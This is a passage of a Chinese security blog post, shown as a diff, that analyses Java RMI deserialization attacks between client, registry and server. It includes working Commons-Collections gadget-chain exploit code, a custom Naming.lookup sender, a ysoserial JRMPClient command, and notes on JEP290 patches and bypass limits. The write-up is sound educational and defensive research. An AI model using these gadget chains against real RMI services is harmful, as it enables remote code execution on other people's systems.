InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /Applications/Calculator.app"&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            Map ouputMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(ouputMap, <span class="string">"pwn"</span>);</span><br><span class="line">            BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>,<span class="number">1099</span>);</span><br><span class="line">            Naming.lookup(registry,badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (RemoteException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中Naming的look函数实现，我从wh1t3p1g师傅写的代码中抽出来了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Naming</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Naming</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title">lookup</span><span class="params">(Registry registry, Object obj)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception, IOException, ClassNotFoundException, RuntimeException, RemoteException, NotBoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Field ref1 = getField(registry.getClass(),<span class="string">"ref"</span>);</span><br><span class="line">        RemoteRef ref = (RemoteRef) ref1.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> interfaceHash = <span class="number">4905912898345647071L</span>;</span><br><span class="line"></span><br><span class="line">        Field operations1 = getField(registry.getClass(),<span class="string">"operations"</span>);</span><br><span class="line">        java.rmi.server.Operation[] operations = (Operation[]) operations1.get(registry);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.rmi.server.RemoteCall call = ref.newCall((java.rmi.server.RemoteObject) registry, operations, <span class="number">2</span>, interfaceHash);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.ObjectOutput out = call.getOutputStream();</span><br><span class="line">                out.writeObject(obj); <span class="comment">// arm obj</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.MarshalException(<span class="string">"error marshalling arguments"</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            ref.invoke(call);</span><br><span class="line">            java.rmi.Remote $result;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.ObjectInput in = call.getInputStream();</span><br><span class="line">                $result = (java.rmi.Remote) in.readObject();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                ref.done(call);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.lang.Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.UnexpectedException(<span class="string">"undeclared checked exception"</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行客户端的代码，会在注册中心弹出计算器。</p>
+<h3 id="补丁-2"><a href="#补丁-2" class="headerlink" title="补丁"></a>补丁</h3><p>相对于服务端的bind方式需要在本地执行，lookup函数没有这个限制。但是它同样受到JEP290的限制。  </p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>绕过方式与前面所提的绕过方式一样。lookup一个UnicastRef对象。</p>
+<h2 id="2-2-注册中心攻击客户端"><a href="#2-2-注册中心攻击客户端" class="headerlink" title="2.2 注册中心攻击客户端"></a>2.2 注册中心攻击客户端</h2><p>从这个过程中可以看到，客户端被攻击执行反序列化的条件和服务端杯攻击执行反序列化的条件一样。与1.2一样。这里就不再赘述了。若是不采用返回TransportConstants.ExceptionalReturn，也可以将返回的Remote对象换成恶意的object。</p>
+<h1 id="3-客户端与服务端"><a href="#3-客户端与服务端" class="headerlink" title="3 客户端与服务端"></a>3 客户端与服务端</h1><p>客户端与服务端之间的交互过程，主要是在客户端通过lookup获取到了注册在注册中心的远程对象引用后，调用远程对象方法时。在调用方法时将与服务端进行连接，将方法及各项参数传输过去。服务端在接收到数据后，在服务端完成方法的调用，然后将结果返回给客户端的一个过程。接下来就来仔细分析一下它。</p>
+<p>首先在这个过程中，客户端需要具有远程对象的接口。且其全限定名必须与服务器上的对象完全相同。可以理解为Stub对象是远程对象在本地的一个代理，当客户端调用方法时，Stub对象将会调用通过网络传递给远程对象。</p>
+<p><font color=#EE7942>[客户端]</font>客户端在完成lookup查询后返回的远程对象Stub使用RemoteObjectInvocationHandler类进行动态代理，即在调用其任何方法之前，必须先调用RemoteObjectInvocationHandler#invoke方法。<br><img src="21.png" alt=""></p>
+<p>跟进invokeRemoteMethod方法。<br><img src="22.png" alt=""></p>
+<p>在这里进入UnicastRef.invoke()函数。继续跟进。<br><img src="23.png" alt=""></p>
+<p>在该函数中，首先建立与服务端的连接，然后向服务端发送调用方法的参数类型、参数值。</p>
+<p><font color=#4682B4>[服务端]</font>服务端接收处理客户端传过来的数据的函数在<code>sun.rmi.server.UnicastServerRef#dispatch</code>。定位到该函数</p>
+<p><img src="24.png" alt=""></p>
+<p>传入的var3为-1，直接进入后面，通过传入的var4，也就是方法的hash值，来查询到方法Method Var8。然后将输入流进行unmarshalCustomCallData，相当于解密一样。然后进入unmarshalParameters()函数，该函数中对var1进行了判断，然后进入unmarshalParametersUnchecked()函数，跟进该函数。</p>
+<p><img src="25.png" alt=""></p>
+<p>该函数中获取方法的参数类型，然后进入unmarshalValue，根据参数类型反序列化出参数值。跟进unmarshalValue函数。</p>
+<p><img src="26.png" alt=""></p>
+<p>这里会根据参数类型进行反序列化，若参数类型不是原生类型，则就直接进行object的反序列化readObject。</p>
+<p><img src="2-2.png" alt=""><br>在反序列化得到参数值之后，回到dispatch方法，接着往下走，然后直接调用方法，获得方法调用的返回值var10。紧接着又到了熟悉的getResultStream(true)方法，这里会向客户端返回81、1以及ID值。</p>
+<p>然后对方法调用的返回值进行判断，若返回值不为Void类型，进入marshalValue()方法。在marshalValue()方法中会对其进行序列化发送给客户端。</p>
+<p><font color=#EE7942>[客户端]</font>客户端在完成发送数据之后，就会进入var7.executeCall()方法等待服务端的返回值，和之前一样，若接收到ransportConstants.ExceptionalReturn后，就会进行直接的反序列化。</p>
+<p>然后继续获取方法调用的方法值，若该值不为void，会进入unmarshalValue()方法根据类型进行反序列化。到这里整个的方法调用就结束了。</p>
+<p>从以上流程中可以进行反序列化的点来看，存在以下攻击。</p>
+<h2 id="3-1-客户端攻击服务端"><a href="#3-1-客户端攻击服务端" class="headerlink" title="3.1 客户端攻击服务端"></a>3.1 客户端攻击服务端</h2><p>若客户端调用的方法参数类型为object类型，则传入一个恶意的object类型，进行反序列化则会导致服务端执行任意命令。实际场景中很少有object类型的参数。攻击者可以用恶意对象替换从Object类派生的参数。</p>
+<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>将服务端的HelloInterface接口中的sayHello函数参数改为object类型。同时将客户端的HelloInterface接口中方法的参数改为object类型。</p>
+<p>客户端的代码如下:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotBoundException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /Applications/Calculator.app"&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            Map ouputMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(ouputMap, <span class="string">"pwn"</span>);</span><br><span class="line">            BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>,<span class="number">1099</span>);</span><br><span class="line">            HelloInterface hello = (HelloInterface) registry.lookup(<span class="string">"hello1"</span>);</span><br><span class="line">            System.out.println(hello.sayHello(badAttributeValueExpException));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (RemoteException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行客户端代码，会导致服务端反序列化，弹出计算器。</p>
+<h2 id="3-2-服务端攻击客户端"><a href="#3-2-服务端攻击客户端" class="headerlink" title="3.2 服务端攻击客户端"></a>3.2 服务端攻击客户端</h2><p>客户端导致反序列化点有如下:</p>
+<ul>
+<li>接收到ransportConstants.ExceptionalReturn后，进行反序列化。</li>
+<li>方法调用的返回值是一个恶意object，导致反序列化。</li>
+</ul>
+<p>对于第一点和1.2、2.2一样。对于第二点，直接修改服务端方法的返回值即可。</p>
+<h1 id="4-DGC通讯方式"><a href="#4-DGC通讯方式" class="headerlink" title="4 DGC通讯方式"></a>4 DGC通讯方式</h1><p>除了以上容易想到的通信方式，还有DGC(分布式垃圾收集)，这是RMI框架用来管理远程对象生命周期的机制。可以通过与DGC通信的方式发送恶意的payload让注册中心反序列化。</p>
+<p><font color=#EE7942>[客户端]</font>定位到<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>。<br><img src="27.png" alt=""></p>
+<p>它的整个过程和前面lookup函数很像。可以看到它先新建了一个socket，然后经过一个过滤，将ObjID、var2以及Lease对象序列化到输出流中。然后执行UnicastRef.invoke函数。</p>
+<p><font color=#43CD80>[注册中心]</font>定位到<code>sun.rmi.transport.DGCImpl_Skel#dispatch</code>。case为1的地方。因为前面传输的为1。<br><img src="28.png" alt=""></p>
+<p>可以看到，直接进行了反序列化操作，若传入的是恶意的object就可以RCE了。剩下的流程与客户端使用lookup与注册中心交互的流程一样。</p>
+<h2 id="4-1-客户端攻击注册中心-JDK-lt-8u121"><a href="#4-1-客户端攻击注册中心-JDK-lt-8u121" class="headerlink" title="4.1 客户端攻击注册中心(JDK &lt; 8u121)"></a>4.1 客户端攻击注册中心(JDK &lt; 8u121)</h2><p>客户端如果通过DGC通信方式向注册中心发送恶意的obj，就会导致反序列化。</p>
+<p>ysoserial工具中实现了这样的一个客户端<code>ysoserial.exploit.JRMPClient.java</code>。截取部分关键代码。</p>
+<p><img src="29.png" alt=""></p>
+<p>可以看到它使用DGC通信方式，且以dirty方法的方式。</p>
+<h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><p>实际中只需要启动注册中心，然后启动JRMPClient就可。启动JRMPClient命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections5 &quot;open &#x2F;Applications&#x2F;Calculator.app&quot;</span><br></pre></td></tr></table></figure>
+
+<p>即可在注册中心弹出计算器。</p>
+<h3 id="补丁-3"><a href="#补丁-3" class="headerlink" title="补丁"></a>补丁</h3><p>JEP290同时也对DGC这种通信方式进行了反序列化类的过滤，定位到<code>DGCImpl#checkInput</code>。</p>
+<p><img src="5-5.png" alt=""> </p>
+<h2 id="4-2-注册中心攻击客户端-JDK-lt-8u232-b09"><a href="#4-2-注册中心攻击客户端-JDK-lt-8u232-b09" class="headerlink" title="4.2 注册中心攻击客户端(JDK&lt;8u232_b09)"></a>4.2 注册中心攻击客户端(JDK&lt;8u232_b09)</h2><p>注册中心攻击客户端的方法如上面一样。但是JDK8u232_b09之后，它无法接收到恶意的object。从而无法利用，还是上面其他方式攻击客户端更加适用。</p>
+<h3 id="补丁-4"><a href="#补丁-4" class="headerlink" title="补丁"></a>补丁</h3><p>由于前面绕过JEP290的方式进行反向链接时使用的就是DGC通信方式，它在修复时，直接在发送/接收数据时，都会对数据进行一个过滤。导致无法利用。<br><img src="3-3.png" alt=""></p>
+<p>在发送/接收时，会进行判断。</p>
+<p><img src="4-4.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var1 !&#x3D; UID.class &amp;&amp; </span><br><span class="line">var1 !&#x3D; VMID.class &amp;&amp; </span><br><span class="line">var1 !&#x3D; Lease.class &amp;&amp; </span><br><span class="line">(var1.getPackage() &#x3D;&#x3D; null || !Throwable.class.isAssignableFrom(var1) || !&quot;java.lang&quot;.equals(var1.getPackage().getName()) &amp;&amp;</span><br><span class="line">!&quot;java.rmi&quot;.equals(var1.getPackage().getName())) &amp;&amp;</span><br><span class="line">var1 !&#x3D; StackTraceElement.class &amp;&amp; </span><br><span class="line">var1 !&#x3D; ArrayList.class &amp;&amp; </span><br><span class="line">var1 !&#x3D; Object.class &amp;&amp; </span><br><span class="line">!var1.getName().equals(&quot;java.util.Collections$UnmodifiableList&quot;) &amp;&amp; </span><br><span class="line">!var1.getName().equals(&quot;java.util.Collections$UnmodifiableCollection&quot;) &amp;&amp; </span><br><span class="line">!var1.getName().equals(&quot;java.util.Collections$UnmodifiableRandomAccessList&quot;) &amp;&amp; </span><br><span class="line">!var1.getName().equals(&quot;java.util.Collections$EmptyList&quot;) </span><br><span class="line">? Status.REJECTED : Status.ALLOWED;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>从以上分析中可以看到，JRMP这种基于序列化数据传输协议使得RMI注册中心、客户端、服务端都能互相攻击。一般来说，服务端和注册中心在同一主机上。</p>
+<p><strong>注册中心/服务端</strong>对<strong>客户端</strong>的攻击:  </p>
+<ul>
+<li>1.2/2.2/3.2: ExceptionReturn</li>
+<li>4.2: ExceptionReturn<ul>
+<li>JDK&lt;8u232_b09</li>
+</ul>
+</li>
+</ul>
+<p><strong>客户端</strong>对<strong>注册中心/服务端</strong>的攻击:</p>
+<ul>
+<li>1.1: bind操作<ul>
+<li>JDK&lt;8u121</li>
+</ul>
+</li>
+<li>1.3: JEP290绕过的bind操作<ul>
+<li>JDK&lt;8u232_b09</li>
+</ul>
+</li>
+<li>2.1: lookup操作<ul>
+<li>JDK&lt;8u121</li>
+</ul>
+</li>
+<li>3.1: Object参数</li>
+<li>4.1: DGC通信<ul>
+<li>JDK&lt;8u232_b09</li>
+</ul>
+</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://xz.aliyun.com/t/6660" target="_blank" rel="noopener">RMI-反序列化</a></li>
+<li><a href="https://paper.seebug.org/1194/" target="_blank" rel="noopener">JAVA RMI 反序列化知识详解</a></li>
+<li><a href="https://xz.aliyun.com/t/2223" target="_blank" rel="noopener">JAVA RMI 反序列化流程原理分析</a></li>
+<li><a href="https://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/" target="_blank" rel="noopener">浅谈Java RMI Registry安全问题</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/24/hash-length-extension-attack/" rel="prev" title="Hash长度扩展攻击">
+      <i class="fa fa-chevron-left"></i> Hash长度扩展攻击
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RMI介绍"><span class="nav-number">1.</span> <span class="nav-text">RMI介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#远程对象"><span class="nav-number">1.1.</span> <span class="nav-text">远程对象</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#1-注册中心与服务端"><span class="nav-number">2.</span> <span class="nav-text">1.注册中心与服务端</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-服务端攻击注册中心–bind-JDK-lt-8u121"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 服务端攻击注册中心–bind (JDK&lt;8u121)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">2.1.1.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#补丁"><span class="nav-number">2.1.2.</span> <span class="nav-text">补丁</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-注册中心攻击服务端"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 注册中心攻击服务端</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-绕过JEP290-JDK-lt-8u232-b09"><span class="nav-number">2.3.</span> <span class="nav-text">1.3 绕过JEP290 (JDK&lt;8u232_b09)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">2.3.1.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#补丁-1"><span class="nav-number">2.3.2.</span> <span class="nav-text">补丁</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-注册中心与客户端"><span class="nav-number">3.</span> <span class="nav-text">2.注册中心与客户端</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-客户端攻击注册中心-JDK-lt-8u121"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 客户端攻击注册中心(JDK&lt;8u121)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-1"><span class="nav-number">3.1.1.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#补丁-2"><span class="nav-number">3.1.2.</span> <span class="nav-text">补丁</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过"><span class="nav-number">3.1.3.</span> <span class="nav-text">绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-注册中心攻击客户端"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 注册中心攻击客户端</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-客户端与服务端"><span class="nav-number">4.</span> <span class="nav-text">3 客户端与服务端</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-客户端攻击服务端"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 客户端攻击服务端</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-2"><span class="nav-number">4.1.1.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-服务端攻击客户端"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 服务端攻击客户端</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-DGC通讯方式"><span class="nav-number">5.</span> <span class="nav-text">4 DGC通讯方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-客户端攻击注册中心-JDK-lt-8u121"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 客户端攻击注册中心(JDK &lt; 8u121)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-3"><span class="nav-number">5.1.1.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#补丁-3"><span class="nav-number">5.1.2.</span> <span class="nav-text">补丁</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-注册中心攻击客户端-JDK-lt-8u232-b09"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 注册中心攻击客户端(JDK&lt;8u232_b09)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#补丁-4"><span class="nav-number">5.2.1.</span> <span class="nav-text">补丁</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ananaskr</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ananaskr</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
